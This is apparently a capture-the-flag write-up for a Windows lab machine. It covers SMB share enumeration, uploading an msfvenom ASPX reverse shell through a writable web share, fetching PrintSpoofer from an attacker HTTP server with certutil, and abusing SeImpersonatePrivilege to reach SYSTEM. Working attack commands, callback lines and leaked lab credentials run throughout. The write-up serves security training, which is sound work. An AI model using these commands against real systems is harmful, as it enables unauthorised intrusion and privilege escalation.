Use https://github.com/dievus/threader3000 to do port scan and later scan with nmap for detailed scan:
```sh
threader3000
```

While it's running and shows some of the open ports we can parallely start looking at some of the ports. E.g. smb is open. Use smbclient to enumerate:
```sh
smbclient -L \\\\10.10.230.202
```

We get shares as below:

DragExtra keys
Clipboard
Clipboard
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk      

We got a web share nt4wrksv. We can try to access it like below:
```
smbclient \\\\10.10.230.202\\nt4wrksv
smb>dir
smb>more passwords.txt
```

We can try evil-winrm with these credentials:
```
evil-winrm -i 10.10.230.202 -u 'Bob' -p '!P@$$W0rD!123'
```

We see that it's not a good credentials. So we have to realise that there could be some misdirections and at some point we have to try something else.

If we run the nmap scan suggested by threader3000, we see that there is one more port (49663) that is running IIS. We can eumenrate that and try gobuster.
Running gobuster reveals nt4wrksv directory and has passwords.txt file. Which is interesting, we can try uploading our own file using smb and see if we can access
it through webserver. So effectively we have uploads right to webserver.

We can use this website to build msfvenom command:
https://pentest.ws/tools/venom-builder

```sh
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.131.125 LPORT=4444 -f aspx -o rev.aspx
```

We get a reverse shell if we access this file from web. If we do whoami, we see below:
```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

In windows there was a vulnerability discovered calle [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), which is a vulnerability in windows server 2016, 2019 and windows 10, that allowed service accounts to on occasion be able to access the system user. Microsoft thought that it was important for certain service accounts to be able to do so. The way they do that is through **SeImpersonatePrivilege**. We can check if our account has that:
```
c:\windows\system32\inetsrv>whoami /priv
```

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

So what we can do is on attacker machine download printspoofer.exe and serve using python htttp server and from reverse shell run below:
```
c:\windows\system32\inetsrv>cd C:\intetpub\wwwroot
c:\intetpub\wwwroot>certutil -urlcache -f http://10.10.131.125:8000/PrintSpoofer.exe printspoofer.exe
```

Or use smbclient and push:
```
smbclient \\\\10.10.230.202\\nt4wrksv
smb>put PrintSpoofer.exe
```

Then run printspoofer from reverse shell like below:
```
c:\intetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
```

Goal of this challenge is "Try harder mentality only goes so far". You can't try harder for forever eventually you need to adapt to your findings and try something else.
